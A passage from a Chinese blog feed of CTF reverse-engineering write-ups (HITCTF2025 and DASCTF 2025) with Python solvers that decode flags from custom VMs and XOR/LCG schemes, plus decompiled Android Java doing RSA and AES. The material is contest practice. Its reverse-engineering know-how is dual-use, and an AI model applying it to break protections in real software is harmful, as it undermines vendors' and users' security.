class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">def lcg_next(s):</span><br><span class="line">  return (1664525 * s + 1013904223) &amp; 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">base = [</span><br><span class="line">  0x1f,0x06,0x67,0x37,0x9c,0x31,0x2c,0x30,0xb7,0xf6,0xa2,0xce,</span><br><span class="line">  0x3b,0x5d,0x45,0x6f,0x25,0x69,0x48,0x8e,0xdc,0xe6,0x1e,0x79,</span><br><span class="line">  0xb3,0x99,0xe9,0xf3,0x4a,0xe7,0x0e,0x80,0x4c,0x73,0x68,0x81,</span><br><span class="line">  0x6c,0x7c,0x1a,0x4d,0xdc,0x1c,0xeb,0xe0,0x3e,0x78,0x4c,0xfd</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">a4 = 0x260</span><br><span class="line">a5 = 0x4D04  # 0x4D00 + ((0xC0000005 - 1) &amp; 0xFF)</span><br><span class="line"></span><br><span class="line"># xor &amp; 右旋</span><br><span class="line">xor_key = (a4 ^ 0x5A) &amp; 0xFF    </span><br><span class="line">rot = (a4 &gt;&gt; 8) &amp; 7               </span><br><span class="line">tmp = []</span><br><span class="line">for b in base:</span><br><span class="line">  b ^= xor_key</span><br><span class="line">  b = ((b &gt;&gt; rot) | ((b &lt;&lt; (8 - rot)) &amp; 0xFF)) &amp; 0xFF  </span><br><span class="line">  tmp.append(b)</span><br><span class="line"></span><br><span class="line">mul_inv = pow((a5 | 1) &amp; 0xFF, -1, 256)  </span><br><span class="line">sub = (a5 &gt;&gt; 8) &amp; 0xFF                   </span><br><span class="line">expected = [ (mul_inv * ((b - sub) &amp; 0xFF)) &amp; 0xFF for b in tmp ]</span><br><span class="line"></span><br><span class="line"># 0x12345679</span><br><span class="line">seed = 0x12345679</span><br><span class="line">flag_bytes = []</span><br><span class="line">state = seed</span><br><span class="line">for e in expected:</span><br><span class="line">  state = lcg_next(state)</span><br><span class="line">  rand = state &amp; 0xFF</span><br><span class="line">  flag_bytes.append(e ^ rand)</span><br><span class="line"></span><br><span class="line">flag = bytes(flag_bytes)</span><br><span class="line">print(flag.decode())  # HITCTF2025&#123;57c8af8e-4e66-4543-b442-00c5</span><br></pre></td></tr></table></figure><h3 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h3><p>简单的VM</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145456864.png" alt="image-20260115145456864"></p><p>丢给AI直接出了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. s[0]=&#x27;f&#x27;; 2) s[1]+1=&#x27;m&#x27; → s[1]=&#x27;l&#x27;;</span><br><span class="line">2. s[2]^s[3]=0x06, s[3]^s[4]=0x1C, s[2]^s[4]=0x1A → 取 s[2..4]=&quot;ag&#123;&quot;；</span><br><span class="line">3. s[6]=&#x27;i&#x27;; s[5]^&#x27;i&#x27;=0x21 → s[5]=&#x27;H&#x27;; s[7]^&#x27;i&#x27;=0x3D → s[7]=&#x27;T&#x27;;</span><br><span class="line">4. s[9]==s[7]=&#x27;T&#x27;; s[8]^s[9]=0x17 → s[8]=&#x27;C&#x27;; s[10]^s[9]=0x12 → s[10]=&#x27;F&#x27;;</span><br><span class="line">5. s[11]*2=190 → s[11]=&#x27;_&#x27;; s[12]=s[14]=50 (&#x27;2&#x27;); s[15]=53 (&#x27;5&#x27;);</span><br><span class="line">6. s[17]=0（字符串终止）；s[16]=s[4]+2 → &#x27;&#125;&#x27;；s[13] 未被约束。</span><br></pre></td></tr></table></figure><p>解析字节码：根据 vm_execute 的 opcode 定义，每条指令长度固定：halt(0)1B, out_const(1)3B, reg_from_in(2)3B, mov(3)3B, mov_imm(4)3B, add(5)3B, add_imm(6)3B, sub(7)3B, sub_imm(8)3B, xor(9)3B, xor_imm(0xA)3B, cmp(0xB)3B, cmp_imm(0xC)3B, jmp(0xD)2B, jnz(0xE)2B, read(0x10)1B, print(0x11)1B。用一个小 Python 脚本按长度切分。</p><p>vm_bytecode_prompt解析结果：一串 out_const reg,val 把输出缓冲区填成 “Enter flag: “，然后 print; halt。所以是提示字串。</p><p>vm_bytecode_checker（280 字节）解析结果：开头 jmp 0x3c 跳过“Wrong!” 构造，末尾 jmp 0x1c 跳到“Correct!” 构造。中间指令用 read 取输入到 input[0..]，reg_from_in 把输入字节搬到 0..7 寄存器，然后通过 cmp_imm、xor、cmp 等组合出约束，失败就 jnz 0x02 跳回错误分支打印“Wrong!”。步进指令即可得到下列等式（用 reg[r] 表示中间寄存器，input[i] 表示输入）：</p><p>cmp_imm reg0,input[0], 0x66 (‘f’) → s[0]&#x3D;’f’</p><p>reg_from_in reg1,input[1]; mov reg0,reg1; add_imm reg1,1; cmp_imm reg1,109 (‘m’) → s[1]+1&#x3D;’m’ → s[1]&#x3D;’l’</p><p>reg_from_in reg1,input[2]; reg_from_in reg2,input[3]; reg_from_in reg3,input[4]; mov reg0,reg1; xor reg0,reg2; cmp_imm reg0,6 + mov reg0,reg2; xor reg0,reg3; cmp_imm reg0,0x1C + mov reg0,reg1; xor reg0,reg3; cmp_imm reg0,0x1A → 解得 s[2..4]&#x3D;”ag{“</p><p>reg_from_in reg1,input[5]; … reg_from_in reg3,input[7]; cmp_imm reg2 (s[6]),105 (‘i’); mov reg0,reg1; xor reg0,reg2; cmp_imm 0x21; mov reg0,reg3; xor reg0,reg2; cmp_imm 0x3D → s[6]&#x3D;’i’, s[5]&#x3D;’H’, s[7]&#x3D;’T’</p><p>reg_from_in reg4,input[8]; reg_from_in reg5,input[9]; reg_from_in reg6,input[10]; cmp reg5,reg3 (s[9]&#x3D;&#x3D;s[7]); mov reg0,reg4; xor reg0,reg5; cmp_imm 0x17; mov reg0,reg6; xor reg0,reg5; cmp_imm 0x12 → s[9]&#x3D;’T’, s[8]&#x3D;’C’, s[10]&#x3D;’F’</p><p>reg_from_in reg1..reg7,input[11..17]; cmp reg2,reg4 (s[12]&#x3D;&#x3D;s[14]); mov reg0,reg1; add reg0,reg0; cmp_imm 0xBE → 2*s[11]&#x3D;190 → s[11]&#x3D;’_’；后续 xor reg0,reg0; cmp reg0,reg7 强制 s[17]&#x3D;0；add reg0,reg2; cmp_imm 50 → s[12]&#x3D;50(‘2’); sub_imm reg0,2; cmp_imm 48 → s[14]&#x3D;50(‘2’); add_imm reg0,5; cmp reg0,reg5 → s[15]&#x3D;53(‘5’); reg_from_in reg0,input[4]; sub reg6,reg0; cmp_imm reg6,2 → s[16]&#x3D;s[4]+2&#x3D;’}’；s[13] 未出现</p><p>flag{HiTCTF_2025}</p><h3 id="ComplexVM"><a href="#ComplexVM" class="headerlink" title="ComplexVM"></a>ComplexVM</h3><p>跟上题一样，不知道complexVM在哪只是逻辑稍微复杂，但是打法是一样的</p><p>程序是自制 VM。ctx+8 是寄存器区，ctx+0x10 旗标（bit0&#x3D;ZF），ctx+0x14 为 PC，ctx+0x18 为 SP，ctx+0x1c 开头是字节码，用户输入缓冲在 ctx+0x41c。sub_140001210 是解释器，sub_140004050 做 reg[x]-imm 并置标志。</p><p>主要指令：</p><ul><li>0x1F：从输入缓冲加载到寄存器（ctx+0x41c[idx] → reg[dest]）。</li><li>0x18：与立即数比较，仅设标志。</li><li>0x17：寄存器与寄存器比较。</li><li>0x12：JNZ，条件跳转依据 ZF。</li><li>0x22&#x2F;0x21&#x2F;0x23&#x2F;0x24：给寄存器写入常量（带常量偏移）。</li></ul><p>字节码逐字节对输入做 load→compare→JNZ，推得各位置字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">code_hex = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">13 0 75 6 5 5 7 1 72 7 3 6e 7 2 6f 7 4 67 7 0 57 20 0 0 20 4 4 20 2 2 20 3 3 20 1 1 20 5 5 1e 0 ff</span></span><br><span class="line"><span class="string">7 1 6f 7 4 65 7 2 72 7 6 74 7 0 43 7 5 63 7 3 72 6 7 7 20 3 3 20 1 1 20 2 2 20 0 0 20 4 4 20 6 6 20 5 5</span></span><br><span class="line"><span class="string">20 7 7 1e 0 ff 7 0 ff 9 0 1 12 0 60 14 0 0 7 0 aa 7 1 55 6 0 1 14 0 0 7 0 0 13 0 69 7 1 ff 17 0 1 12 0 3 1c 0 0</span></span><br><span class="line"><span class="string">1f 0 2 18 0 61 12 0 3 1f 0 1 18 0 6c 12 0 3 1f 0 0 18 0 66 12 0 3 1f 0 3 18 0 67 12 0 3 1f 0 4 18 0 7b 12 0 3</span></span><br><span class="line"><span class="string">1f 0 7 18 0 54 12 0 3 1f 0 6 18 0 49 12 0 3 1f 0 5 18 0 48 12 0 3 1f 0 8 18 0 43 12 0 3 1f 0 c 18 0 30 12 0 3</span></span><br><span class="line"><span class="string">1f 0 a 18 0 46 12 0 3 1f 0 b 18 0 32 12 0 3 1f 0 9 18 0 54 12 0 3 1f 0 d 18 0 32 12 0 3 1f 0 e 18 0 35 12 0 3</span></span><br><span class="line"><span class="string">1f 0 f 18 0 5f 12 0 3 1f 0 10 1f 1 b 17 0 1 12 0 3 1f 0 11 22 1 a8 17 1 0 12 0 3 1f 0 12 9 1 1 17 1 0 12 0 3</span></span><br><span class="line"><span class="string">7 0 80 15 0 0 13 0 5d 16 0 0 9 0 1 12 1 3e 1f 0 13 6 1 0 18 1 52 12 0 3 1f 0 14 1f 1 17 6 0 1 12 0 3 18 1 63</span></span><br><span class="line"><span class="string">12 0 3 1f 0 15 1f 1 16 3 1 0 18 1 3 12 0 3 1f 1 10 8 1 2 17 1 0 12 0 3 1f 0 18 18 0 7d 12 0 3 1f 0 19 18 0 0</span></span><br><span class="line"><span class="string">12 0 3 7 0 80 15 0 0 13 0 5d 16 0 0 9 0 1 12 1 9b 10 0 2a ff 0 0 7 0 49 7 1 6e 7 2 70 7 3 75 7 4 74 7 5 20 20 0 0</span></span><br><span class="line"><span class="string">20 1 1 20 2 2 20 3 3 20 4 4 20 5 5 7 0 79 7 1 6f 7 2 75 7 3 72 7 4 20 7 5 66 20 6 0 20 7 1 20 8 2 20 9 3 20 a 4 20 b 5 7 0 6c 7 1 61 7 2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">code = [<span class="built_in">int</span>(x, <span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> code_hex.split()]</span><br><span class="line"></span><br><span class="line">pairs = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(code):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0x1f</span> <span class="keyword">and</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(code):</span><br><span class="line">        dest, idx = code[i + <span class="number">1</span>], code[i + <span class="number">2</span>]</span><br><span class="line">        <span class="comment"># 向后几步找 0x18 同目标寄存器的比较立即数</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">            k = i + j</span><br><span class="line">            <span class="keyword">if</span> k + <span class="number">2</span> &gt;= <span class="built_in">len</span>(code): <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> code[k] == <span class="number">0x18</span> <span class="keyword">and</span> code[k + <span class="number">1</span>] == dest:</span><br><span class="line">                pairs[idx] = code[k + <span class="number">2</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">sorted</span>(pairs):</span><br><span class="line">    v = pairs[k]</span><br><span class="line">    ch = <span class="built_in">chr</span>(v) <span class="keyword">if</span> <span class="number">32</span> &lt;= v &lt; <span class="number">127</span> <span class="keyword">else</span> v</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ch&#125;</span>&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag{HITCTF2025_287ec47c}</p><h3 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h3><p>有毒 快跑</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HITCTF2025-wp&quot;&gt;&lt;a href=&quot;#HITCTF2025-wp&quot; class=&quot;headerlink&quot; title=&quot;HITCTF2025 wp&quot;&gt;&lt;/a&gt;HITCTF2025 wp&lt;/h1&gt;&lt;p&gt;好久没更新了，期末考试太忙了，之前打的比赛传一下&lt;/</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2025下半年赛 RE wp</title>
    <link href="http://matriy330.github.io/8b3b5504/"/>
    <id>http://matriy330.github.io/8b3b5504/</id>
    <published>2025-12-07T06:44:33.000Z</published>
    <updated>2025-12-07T06:45:46.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF-2025下半年赛-RE-wp"><a href="#DASCTF-2025下半年赛-RE-wp" class="headerlink" title="DASCTF 2025下半年赛 RE wp"></a>DASCTF 2025下半年赛 RE wp</h1><h2 id="ezmac"><a href="#ezmac" class="headerlink" title="ezmac"></a>ezmac</h2><p>简单逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x7d</span>,<span class="number">0x7b</span>,<span class="number">0x68</span>,<span class="number">0x7f</span>,<span class="number">0x69</span>,<span class="number">0x78</span>,<span class="number">0x44</span>,<span class="number">0x78</span>,<span class="number">0x72</span>,<span class="number">0x21</span>,<span class="number">0x74</span>,<span class="number">0x76</span>,<span class="number">0x75</span>,<span class="number">0x22</span>,<span class="number">0x26</span>,<span class="number">0x7b</span>,<span class="number">0x7c</span>,<span class="number">0x7e</span>,<span class="number">0x78</span>,<span class="number">0x7a</span>,<span class="number">0x2e</span>,<span class="number">0x2d</span>,<span class="number">0x7f</span>,<span class="number">0x2d</span>]</span><br><span class="line">key_start = <span class="number">0x39</span>  <span class="comment"># 57</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b ^ ((key_start + i) &amp; <span class="number">0xFF</span>)) <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>DASCTF{83c720da35436cc0}</p><h2 id="androidfile"><a href="#androidfile" class="headerlink" title="androidfile"></a>androidfile</h2><blockquote><p>hacker截获了某公司的重要数据包和RSA公私钥，请你帮助他提取藏在数据包中的flag。</p></blockquote><p>RSA</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512061923909.png" alt="image-20251206192331850"></p><p>Java 层</p><p>生成两个 16 字节随机串作为 keyStr 和 ivStr（代码里就是 A() 生成的）。</p><p>用 RSA 公钥加密 keyStr、ivStr，分别前缀成 enkey_<RSA_ct_key>eniv_<RSA_ct_iv>，整体作为输入传给 native a_p，得到 RC4+base64 的第一段。</p><p>AES 部分：用 AES&#x2F;CBC&#x2F;PKCS5 对用户输入加密，得到第二段。UI 把第一段 + &lt;-encryptinput-&gt; + 第二段展示。</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062008658.png" alt="55c3a0e7-cd64-49b1-b456-de762479013c"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dasctf.androidfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> R0.c;</span><br><span class="line"><span class="keyword">import</span> android.content.res.Resources;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.Window;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.J;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.K;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.p;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.w;</span><br><span class="line"><span class="keyword">import</span> c0.C0121a;</span><br><span class="line"><span class="keyword">import</span> f.AbstractActivityC0139h;</span><br><span class="line"><span class="keyword">import</span> f.C0138g;</span><br><span class="line"><span class="keyword">import</span> i0.View$OnClickListenerC0168a;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyFactory;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.X509EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AbstractActivityC0139h</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: A  reason: collision with root package name */</span></span><br><span class="line">    <span class="keyword">public</span> TextView f1684A;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: y  reason: collision with root package name */</span></span><br><span class="line">    <span class="keyword">public</span> Button f1685y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: z  reason: collision with root package name */</span></span><br><span class="line">    <span class="keyword">public</span> TextView f1686z;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(w.i(<span class="string">&quot;ZLIbw2UnROtssBo=\n&quot;</span>, <span class="string">&quot;Bdx/sQpOII0=\n&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainActivity</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.f739d.f1683b.f(<span class="string">&quot;androidx:appcompat&quot;</span>, <span class="keyword">new</span> <span class="title class_">C0121a</span>(<span class="built_in">this</span>));</span><br><span class="line">        i(<span class="keyword">new</span> <span class="title class_">C0138g</span>(<span class="built_in">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">i2</span> <span class="operator">=</span> w.i(<span class="string">&quot;EDXRQcjNLspDYIYUm5BxwktojhyTiGnaU3CWBIu9Xu9oTak5sLVW53BVsSGorU7/eF25\n&quot;</span>, <span class="string">&quot;IATjcvz4GKg=\n&quot;</span>);</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>; i3 &lt; <span class="number">16</span>; i3++) &#123;</span><br><span class="line">            stringBuffer.append(i2.charAt(random.nextInt(i2.length())));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuffer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">C</span><span class="params">(String str, String str2, String str3)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = str2.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] bytes2 = str3.getBytes();</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">secretKeySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(bytes, w.i(<span class="string">&quot;Udks\n&quot;</span>, <span class="string">&quot;EJx/huJaZmg=\n&quot;</span>));</span><br><span class="line">        <span class="type">IvParameterSpec</span> <span class="variable">ivParameterSpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(bytes2);</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(w.i(<span class="string">&quot;BchPNMUH8BUUxl9IsxXSXiDkcnw=\n&quot;</span>, <span class="string">&quot;RI0cG4ZFszo=\n&quot;</span>));</span><br><span class="line">        cipher.init(<span class="number">1</span>, secretKeySpec, ivParameterSpec);</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeToString(cipher.doFinal(str.getBytes(w.i(<span class="string">&quot;yd86S2M=\n&quot;</span>, <span class="string">&quot;nIt8ZlvsRB4=\n&quot;</span>))), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">D</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = str.getBytes();</span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">generatePublic</span> <span class="operator">=</span> KeyFactory.getInstance(w.i(<span class="string">&quot;asEy\n&quot;</span>, <span class="string">&quot;OJJz9SnyFic=\n&quot;</span>)).generatePublic(<span class="keyword">new</span> <span class="title class_">X509EncodedKeySpec</span>(Base64.decode(w.i(<span class="string">&quot;QMXCGE8qPL1G7O8mYw0GuUzS8C1JKiSzXvT0GFg6L7VMyYYubTo33EXs/gEzEjSWS9eNF2EoKZxH\n5Z4aQw49wmnQ/UBsCCmkTO/EJmAtALZJy81YZBA3tmvvgDo5CCaSPcKaXVgiXIRJ9scoRDcto1Tg\n2CdKDiC0TPTwLkoqWMo=\n&quot;</span>, <span class="string">&quot;DYO1bwt7Zfc=\n&quot;</span>), <span class="number">0</span>)));</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(w.i(<span class="string">&quot;sSby\n&quot;</span>, <span class="string">&quot;43WztTWiQRk=\n&quot;</span>));</span><br><span class="line">        cipher.init(<span class="number">1</span>, generatePublic);</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeToString(cipher.doFinal(bytes), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">a_p</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v10, types: [B.h] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v24 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v25 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v26 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v27 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v28 */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// f.AbstractActivityC0139h, androidx.activity.n, y.f, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        ?? r10;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> p.f753a;</span><br><span class="line">        <span class="type">J</span> <span class="variable">j2</span> <span class="operator">=</span> J.f705a;</span><br><span class="line">        <span class="type">K</span> <span class="variable">k2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">K</span>(<span class="number">0</span>, <span class="number">0</span>, j2);</span><br><span class="line">        <span class="type">K</span> <span class="variable">k3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">K</span>(p.f753a, p.f754b, j2);</span><br><span class="line">        <span class="type">View</span> <span class="variable">decorView</span> <span class="operator">=</span> getWindow().getDecorView();</span><br><span class="line">        c.d(decorView, <span class="string">&quot;window.decorView&quot;</span>);</span><br><span class="line">        <span class="type">Resources</span> <span class="variable">resources</span> <span class="operator">=</span> decorView.getResources();</span><br><span class="line">        c.d(resources, <span class="string">&quot;view.resources&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">booleanValue</span> <span class="operator">=</span> ((Boolean) j2.b(resources)).booleanValue();</span><br><span class="line">        <span class="type">Resources</span> <span class="variable">resources2</span> <span class="operator">=</span> decorView.getResources();</span><br><span class="line">        c.d(resources2, <span class="string">&quot;view.resources&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">booleanValue2</span> <span class="operator">=</span> ((Boolean) j2.b(resources2)).booleanValue();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> Build.VERSION.SDK_INT;</span><br><span class="line">        <span class="keyword">if</span> 